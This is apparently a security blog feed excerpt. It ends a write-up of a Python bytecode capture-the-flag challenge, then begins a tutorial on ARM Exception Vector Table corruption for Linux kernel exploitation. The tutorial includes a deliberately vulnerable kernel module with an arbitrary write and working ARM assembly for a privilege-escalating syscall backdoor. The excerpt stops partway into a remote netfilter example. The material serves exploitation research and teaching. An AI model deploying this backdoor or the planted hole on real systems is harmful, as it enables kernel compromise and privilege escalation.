<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----------------------------------------------------------------------------------------------------------------------[regs]
</span><span class='line'>  RAX: 0x00007FFFF7FA7050  RBX: 0x00007FFFF7F0F758  RBP: 0x00000000007B0270  RSP: 0x00007FFFFFFFE040  o d I t s Z a P c
</span><span class='line'>  RDI: 0x00007FFFF7F0F758  RSI: 0x00007FFFF7FA7050  RDX: 0x0000000000000000  RCX: 0x0000000000000828  RIP: 0x0000000000513E56
</span><span class='line'>  R8 : 0x0000000000880728  R9 : 0x00007FFFF7F8D908  R10: 0x00007FFFF7FA7050  R11: 0x00007FFFF7FA7050  R12: 0x00007FFFF7FD0F48
</span><span class='line'>  R13: 0x00000000007EF0A0  R14: 0x00007FFFF7F3CB00  R15: 0x00007FFFF7F07ED0
</span><span class='line'>  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
</span><span class='line'>-----------------------------------------------------------------------------------------------------------------------[code]
</span><span class='line'>=&gt; 0x513e56 &lt;run_me+198&gt;:       call   0x422b40 &lt;PyObject_Call&gt;
</span><span class='line'>-----------------------------------------------------------------------------------------------------------------------------
</span><span class='line'>gdb$ dpy $rdi
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;\\x7c\\x00\\x00\\x64\\x01\\x00\\x6b\\x03\\x00\\x72\\x19\\x00\\x7c\\x00\\x00\\x64\\x02\\x00\\x55\\x61\\x00\\x00\\x6e\\x6e\\x00\\x7c\\x01\\x00\\x6a\\x02\\x00\\x64\\x03\\x00\\x6a\\x03\\x00\\x64\\x04\\x00\\x77\\x00\\x00\\xa0\\x05\\x00\\xc8\\x06\\x00\\xa0\\x07\\x00\\xb2\\x08\\x00\\xa0\\x09\\x00\\xea\\x0a\\x00\\xa0\\x0b\\x00\\x91\\x08\\x00\\xa0\\x0c\\x00\\x9e\\x0b\\x00\\xa0\\x0d\\x00\\xd4\\x08\\x00\\xa0\\x0e\\x00\\xd5\\x0f\\x00\\xa0\\x10\\x00\\xdd\\x11\\x00\\xa0\\x07\\x00\\xcc\\x08\\x00\\xa0\\x12\\x00\\x78\\x0b\\x00\\xa0\\x13\\x00\\x87\\x0f\\x00\\xa0\\x14\\x00\\x5b\\x15\\x00\\xa0\\x16\\x00\\x97\\x17\\x00\\x67\\x1a\\x00\\x53\\x86\\x01\\x00\\x86\\x01\\x00\\x86\\x01\\x00\\x54\\x64\\x00\\x00\\x1b&#39;,
</span><span class='line'>   &#39;co_consts&#39;: (None,
</span><span class='line'>     3,
</span><span class='line'>     1,
</span><span class='line'>     &#39;&#39;,
</span><span class='line'>     {&#39;co_code&#39;: &#39;\\x8f\\x00\\x00\\x5d\\x15\\x00\\x87\\x01\\x00\\x7c\\x00\\x00\\x8f\\x01\\x00\\x64\\x00\\x00\\x4e\\x86\\x01\\x00\\x59\\x54\\x71\\x03\\x00\\x64\\x01\\x00\\x1b&#39;,
</span><span class='line'>      &#39;co_consts&#39;: (13, None),
</span><span class='line'>      &#39;co_name&#39;: &#39;&lt;genexpr&gt;&#39;,
</span><span class='line'>      &#39;co_names&#39;: (&#39;chr&#39;,),
</span><span class='line'>      &#39;co_varnames&#39;: (&#39;.0&#39;, &#39;_&#39;)},
</span><span class='line'>     75,
</span><span class='line'>     98,
</span><span class='line'>     127,
</span><span class='line'>     45,
</span><span class='line'>     89,
</span><span class='line'>     101,
</span><span class='line'>     104,
</span><span class='line'>     67,
</span><span class='line'>     122,
</span><span class='line'>     65,
</span><span class='line'>     120,
</span><span class='line'>     99,
</span><span class='line'>     108,
</span><span class='line'>     95,
</span><span class='line'>     125,
</span><span class='line'>     111,
</span><span class='line'>     97,
</span><span class='line'>     100,
</span><span class='line'>     110),
</span><span class='line'>   &#39;co_name&#39;: &#39;foo&#39;,
</span><span class='line'>   &#39;co_names&#39;: (&#39;True&#39;, &#39;quarkslab&#39;, &#39;append&#39;, &#39;join&#39;),
</span><span class='line'>   &#39;co_varnames&#39;: ()},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;foo&#39;}
</span></code></pre></td></tr></table></div></figure>


<p>Even before studying / disassembling the code, we see some interesting things: <em>chr</em>, <em>quarkslab</em>, <em>append</em>, <em>join</em>, etc. It definitely feels like that function is generating the flag we are looking for.</p>

<p>Seeing <em>append</em>, <em>join</em> and another code object (in <em>co_consts</em>) suggests that a <em>generator</em> is used to populate the variable <em>quarkslab</em>. We also can guess that the bunch of bytes we are seeing may be the flag encoded/encrypted &mdash; anyway we can infer <strong>too much information to me</strong> just by dumping/looking at the object.</p>

<p>Let&rsquo;s use our magic <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a> to see those codes objects:</p>

<figure class='code'><figcaption><span>part2 & its generator disassembled</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'> 19     &gt;&gt;    0 LOAD_GLOBAL              0 (True)
</span><span class='line'>              3 LOAD_CONST               1 (3)
</span><span class='line'>              6 COMPARE_OP               3 (!=)
</span><span class='line'>              9 POP_JUMP_IF_FALSE       25
</span><span class='line'>
</span><span class='line'> 20          12 LOAD_GLOBAL              0 (True)
</span><span class='line'>             15 LOAD_CONST               2 (1)
</span><span class='line'>             18 INPLACE_SUBTRACT
</span><span class='line'>             19 STORE_GLOBAL             0 (True)
</span><span class='line'>             22 JUMP_FORWARD           110 (to 135)
</span><span class='line'>
</span><span class='line'> 22     &gt;&gt;   25 LOAD_GLOBAL              1 (quarkslab)
</span><span class='line'>             28 LOAD_ATTR                2 (append)
</span><span class='line'>             31 LOAD_CONST               3 (&#39;&#39;)
</span><span class='line'>             34 LOAD_ATTR                3 (join)
</span><span class='line'>             37 LOAD_CONST               4 (&lt;code object &lt;genexpr&gt; at 023A84A0, file &quot;obfuscate/gen.py&quot;, line 22&gt;)
</span><span class='line'>             40 MAKE_FUNCTION            0
</span><span class='line'>             43 LOAD_CONST2              5 (75)
</span><span class='line'>             46 LOAD_CONST3              6 (98)
</span><span class='line'>             49 LOAD_CONST2              7 (127)
</span><span class='line'>             52 LOAD_CONST5              8 (45)
</span><span class='line'>             55 LOAD_CONST2              9 (89)
</span><span class='line'>             58 LOAD_CONST4             10 (101)
</span><span class='line'>             61 LOAD_CONST2             11 (104)
</span><span class='line'>             64 LOAD_CONST6              8 (45)
</span><span class='line'>             67 LOAD_CONST2             12 (67)
</span><span class='line'>             70 LOAD_CONST7             11 (104)
</span><span class='line'>             73 LOAD_CONST2             13 (122)
</span><span class='line'>             76 LOAD_CONST8              8 (45)
</span><span class='line'>             79 LOAD_CONST2             14 (65)
</span><span class='line'>             82 LOAD_CONST10            15 (120)
</span><span class='line'>             85 LOAD_CONST2             16 (99)
</span><span class='line'>             88 LOAD_CONST9             17 (108)
</span><span class='line'>             91 LOAD_CONST2              7 (127)
</span><span class='line'>             94 LOAD_CONST11             8 (45)
</span><span class='line'>             97 LOAD_CONST2             18 (95)
</span><span class='line'>            100 LOAD_CONST12            11 (104)
</span><span class='line'>            103 LOAD_CONST2             19 (125)
</span><span class='line'>            106 LOAD_CONST16            15 (120)
</span><span class='line'>            109 LOAD_CONST2             20 (111)
</span><span class='line'>            112 LOAD_CONST14            21 (97)
</span><span class='line'>            115 LOAD_CONST2             22 (100)
</span><span class='line'>            118 LOAD_CONST15            23 (110)
</span><span class='line'>            121 BUILD_LIST              26
</span><span class='line'>            124 GET_ITER
</span><span class='line'>            125 CALL_FUNCTION            1
</span><span class='line'>            128 CALL_FUNCTION            1
</span><span class='line'>            131 CALL_FUNCTION            1
</span><span class='line'>            134 POP_TOP
</span><span class='line'>        &gt;&gt;  135 LOAD_CONST               0 (None)
</span><span class='line'>            138 RETURN_VALUE
</span><span class='line'>================================================================================
</span><span class='line'> 22           0 LOAD_FAST                0 (.0)
</span><span class='line'>        &gt;&gt;    3 FOR_ITER                21 (to 27)
</span><span class='line'>              6 LOAD_CONST16             1 (None)
</span><span class='line'>              9 LOAD_GLOBAL              0 (chr)
</span><span class='line'>             12 LOAD_FAST                1 (_)
</span><span class='line'>             15 LOAD_CONST               0 (13)
</span><span class='line'>             18 BINARY_XOR
</span><span class='line'>             19 CALL_FUNCTION            1
</span><span class='line'>             22 YIELD_VALUE
</span><span class='line'>             23 POP_TOP
</span><span class='line'>             24 JUMP_ABSOLUTE            3
</span><span class='line'>        &gt;&gt;   27 LOAD_CONST               1 (None)
</span><span class='line'>             30 RETURN_VALUE
</span></code></pre></td></tr></table></div></figure>


<p>Great, that definitely sounds like what we described earlier.</p>

<h3>I need a decompiler dad</h3>

<p>Now because we really like to hack things, I decided to patch a Python decompiler to support the opcodes defined in this challenge in order to fully decompile the codes we saw so far.</p>

<p>I won&rsquo;t bother you with how I managed to do it though ; long story short: it is built it on top of <a href="https://github.com/gdelugre/fupy">fupy.py</a> which is a readable hackable Python 2.7 decompiler written by the awesome <a href="https://github.com/gdelugre">Guillaume Delugre</a> &mdash; Cheers to my mate <a href="https://twitter.com/Myst3rie">@Myst3rie</a> for telling about this project!</p>

<p>So here is <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/decompiler_ql_chall.py">decompiler.py</a> working on the two code objects of the challenge:</p>

<figure class='code'><figcaption><span>decompiiiiiilation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\ql-chall-python-2014&gt; python .\decompiler_ql_chall.py
</span><span class='line'>PART1 ====================
</span><span class='line'>Robert_Forsyth = 1
</span><span class='line'>True = True + 1
</span><span class='line'>
</span><span class='line'>PART2 ====================
</span><span class='line'>if True != 3:
</span><span class='line'>    True = True - 1
</span><span class='line'>else:
</span><span class='line'>    quarkslab.append(&#39;&#39;.join(chr(_ ^ 13) for _ in [75, 98, 127, 45, 89, 101, 104, 45, 67, 104, 122, 45, 65, 120, 99, 108, 127, 45, 95, 104, 125, 120, 111, 97, 100, 110]))
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant &mdash; time to get a flag now :&ndash;).
Here are the things we need to do:</p>

<ol>
<li>Set <em>True</em> to 2 (so that it&rsquo;s equal to 3 in the part 2)</li>
<li>Declare a <em>list</em> named <em>quarkslab</em></li>
<li>Jump over the middle part of the function where it will run the bytecode you gave as argument (or give a valid marshaled string that won&rsquo;t crash the interpreter)</li>
<li>Profit!</li>
</ol>


<figure class='code'><figcaption><span>win</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; True = 2
</span><span class='line'>&gt;&gt;&gt; quarkslab = list()
</span><span class='line'>&gt;&gt;&gt; import do_not_run_me as v
</span><span class='line'>&gt;&gt;&gt; v.run_me(&quot;c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00\x00\x1B(\x01\x00\x00\x00N(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00rstdinrt\x01\x00\x00\x00a\x01\x00\x00\x00s\x02\x00\x00\x00\x00\x01&quot;)
</span><span class='line'>&gt;&gt;&gt; quarkslab
</span><span class='line'>[&#39;For The New Lunar Republic&#39;]
</span></code></pre></td></tr></table></div></figure>


<h1>Conclusion</h1>

<p>This was definitely entertaining, so thanks to Serge and <a href="http://blog.quarkslab.com/">Quarkslab</a> for putting this challenge together! I feel like it would have been cooler to force people to write a disassembler or/and a decompiler to study the code of <em>run_me</em> though ; because as I mentioned at the very beginning of the article you don&rsquo;t really need any tool to guess/know roughly where the flag is, and how to get it. I still did write all those little scripts because it was fun and cool that&rsquo;s all!</p>

<p>Anyway, the codes I talked about are available on my github as usual if you want to have a look at them. You can also have look at <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">wildfire.py</a> if you like weird/wild/whatever Python beasts!</p>

<p>That&rsquo;s all for today guys, I hope it wasn&rsquo;t too long and that you did enjoy the read.</p>

<p>By the way, we still think it would be cool to have more people posting on that blog, so if you are interested feel free to <a href="https://doar-e.github.io/about/">contact us</a>!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Corrupting the ARM Exception Vector Table]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt/"/>
    
    <updated>2014-04-30T21:01:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I&rsquo;d explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper &ldquo;Vector Rewrite Attack&rdquo;<a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">[1]</a>, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.</p>

<p>The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.</p>

<p>I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).</p>

<!--more-->


<h1>ARM Exceptions and the Exception Vector Table</h1>

<p>In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor&rsquo;s &ldquo;permissions&rdquo; in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation:</p>

<pre><code> Exception                   |       Mode            |     Description
 ----------------------------|-----------------------|-------------------------------------------------------------------
 Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
 Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
 Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
 Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
 Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
</code></pre>

<p>The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system</p>

<h2>The Exceptions</h2>

<p>The exceptions change the processor mode and each exception has access to a set of <em>banked</em> registers. These can be described as a set of registers that exist only in the exception&rsquo;s context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/banked_regs.png" alt="Banked Registers" /></p>

<h2>The Exception Vector Table</h2>

<p>The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is <strong>0xffff0000</strong>. Each entry in the EVT is also at a known offset as can be seen on the following table:</p>

<pre><code> Exception                   |       Address            
 ----------------------------|-----------------------
 Reset                       |      0xffff0000           
 Undefined Instruction       |      0xffff0004       
 SWI                         |      0xffff0008  
 Prefetch Abort              |      0xffff000c       
 Data Abort                  |      0xffff0010 
 Reserved                    |      0xffff0014  
 IRQ                         |      0xffff0018   
 FIQ                         |      0xffff001c  
</code></pre>

<h3>A note about the Undefined Instruction exception</h3>

<p>Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn&rsquo;t because it is used by the kernel. <em>Hard float</em> and <em>Soft float</em> are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel.</p>

<p>If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.</p>

<h1>Corrupting the EVT</h1>

<p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let&rsquo;s try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let&rsquo;s now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>

<h2>Local scenario</h2>

<p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">/</span> <span class="n">called</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">system</span> <span class="n">call</span> <span class="n">is</span> <span class="n">done</span> <span class="n">on</span> <span class="n">the</span> <span class="n">device</span> <span class="n">file</span>
</span><span class='line'><span class="k">static</span> <span class="kt">ssize_t</span> <span class="n">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="nl">end:</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn&rsquo;t set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let&rsquo;s take a closer look at the EVT:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/evt_8i.png" alt="EVT Disassembly" /><br/>
As expected we see a bunch of control transfer instructions but one thing we notice about them is that &ldquo;closest&rdquo; referenced address is <em>0xffff0200</em>. Let&rsquo;s take a look what is between the end of the EVT and 0xffff0200:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/evt_400wx.png" alt="EVT Inspection" /><br/>
It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.</p>

<h3>The Exploit</h3>

<p>Recapitulating our exploit:</p>

<pre><code>1. Store our backdoor at *0xffff0020*.  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.  
</code></pre>

<p>Here is the backdoor&rsquo;s code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">@</span> <span class="nf">check</span> <span class="nv">if</span> <span class="nv">magic</span>
</span><span class='line'>    <span class="nf">cmp</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xb0000000</span>
</span><span class='line'>    <span class="nf">bne</span>     <span class="nv">exit</span>
</span><span class='line'>
</span><span class='line'><span class="nl">elevate:</span>
</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span><span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r3</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049a00</span>     <span class="err">@</span> <span class="nv">prepare_kernel_cred</span>
</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r3</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049438</span>     <span class="err">@</span> <span class="nv">commit_creds</span>
</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r4</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
</span><span class='line'>
</span><span class='line'><span class="err">@</span> <span class="nf">go</span> <span class="nv">to</span> <span class="nv">syscall</span> <span class="nv">handler</span>
</span><span class='line'><span class="nl">exit:</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">980</span><span class="p">]</span>      <span class="err">@</span> <span class="nv">go</span> <span class="nv">to</span> <span class="nv">normal</span> <span class="nv">swi</span> <span class="nv">handler</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/local_example">here</a>. Run the exploit:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/local_poc.png" alt="Local PoC" /></p>

<h2>Remote scenario</h2>

<p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
</span><span class='line'>    <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
</span><span class='line'>    <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
